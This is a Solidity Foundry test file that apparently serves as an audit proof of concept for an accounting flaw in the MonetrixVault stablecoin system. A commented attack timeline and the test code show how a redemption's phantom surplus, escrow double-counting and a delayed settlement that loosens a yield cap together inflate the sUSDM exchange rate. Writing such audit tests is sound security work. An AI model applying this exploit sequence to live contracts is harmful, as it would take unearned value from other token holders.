// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/tokens/USDM.sol";
import "../src/tokens/sUSDM.sol";
import "../src/interfaces/HyperCoreConstants.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy contracts, fund accounts, deposit USDC, mint USDM, stake to sUSDM, bridge to L1.
// 2. [T=0] Attacker (large holder) calls Vault.requestRedeem() for a significant USDM amount. Vault transfers USDM from user to itself and calls RedeemEscrow.addObligation(), but does NOT yet transfer USDC to RedeemEscrow. USDM supply still includes the redeemed tokens, yet totalBackingSigned() counts the USDC as if it were still backing - creating phantom surplus.
// 3. [T=0] Operator calls bridgePrincipalFromL1 to cover shortfall, then fundRedemptions. Vault transfers USDC to RedeemEscrow. Now distributableSurplus() counts the escrow balance AND the still-unburned USDM in Vault, double-counting the same capital.
// 4. [T=30 days] Operator has not called settleDailyPnL for 30 days. The annualized yield cap (Gate 4) scales with elapsed time and becomes unbounded. Operator calls settle() and distributeYield(). The entire inflated phantom surplus passes the cap check and is injected into sUSDM, inflating exchange rate.
// 5. [Assert] Verify sUSDM exchange rate is artificially inflated, proving attacker can extract unearned value.

contract AuditAgentPoC is ToL1WeiHarness {
    function setUp() public override {
        super.setUp();
    }

    function test_exploit() public {
        vm.etch(HyperCoreConstants.CORE_WRITER, address(new MockCoreWriter()).code);
        _mockVaultL1SpotUsdc(type(uint64).max);

        // 1. Setup: Deposit and stake
        _depositAs(user1, 100_000e6);
        _stakeAs(user1, 50_000e6);

        vm.warp(block.timestamp + 6 hours);
        vm.prank(operator);
        vault.keeperBridge(MonetrixVault.BridgeTarget.Vault);

        uint256 initialTotalAssets = susdm.totalAssets();
        uint256 initialTotalSupply = susdm.totalSupply();
        uint256 initialRate = (initialTotalAssets * 1e18) / initialTotalSupply;
        console.log("Step 1: initialRate =", initialRate);

        // 2. Attacker requests redeem (creates phantom surplus)
        uint256 redeemAmount = 40_000e6;
        vm.startPrank(user1);
        usdm.approve(address(vault), redeemAmount);
        uint256 reqId = vault.requestRedeem(redeemAmount);
        vm.stopPrank();

        int256 phantomSurplus = accountant.distributableSurplus();
        console.log("Step 2: phantomSurplus =", uint256(phantomSurplus));

        // 3. Operator funds redemptions (double-counts escrow)
        uint256 shortfall = vault.redemptionShortfall();
        vm.prank(operator);
        vault.bridgePrincipalFromL1(shortfall);
        usdc.mint(address(vault), shortfall);

        vm.prank(operator);
        vault.fundRedemptions(shortfall);

        int256 doubleCountedSurplus = accountant.distributableSurplus();
        console.log("Step 3: doubleCountedSurplus =", uint256(doubleCountedSurplus));

        // 4. Delay settlement to unbound the yield cap (Gate 4)
        vm.warp(block.timestamp + 30 days);

        uint256 proposedYield = doubleCountedSurplus > 0 ? uint256(doubleCountedSurplus) : 0;
        vm.prank(operator);
        vault.settle(proposedYield);

        vm.prank(operator);
        vault.distributeYield();

        // 5. Assert exchange rate inflation
        uint256 finalTotalAssets = susdm.totalAssets();
        uint256 finalTotalSupply = susdm.totalSupply();
        uint256 finalRate = (finalTotalAssets * 1e18) / finalTotalSupply;
        console.log("Step 5: finalRate =", finalRate);

        assertGt(finalRate, initialRate, "sUSDM exchange rate artificially inflated by phantom surplus");
    }
}
